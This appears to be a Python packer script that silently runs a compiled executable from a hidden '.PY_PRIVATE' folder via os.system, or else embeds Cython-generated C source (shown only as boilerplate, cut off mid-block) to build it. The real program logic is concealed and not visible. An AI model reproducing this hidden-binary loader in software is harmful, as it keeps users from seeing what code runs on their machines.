
import os
import sys

PSH_TEAM_KEY = "Ø¨Ø® ðŸ‘€"

EXECUTE_FILE = ".PY_PRIVATE/20240909130934352"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
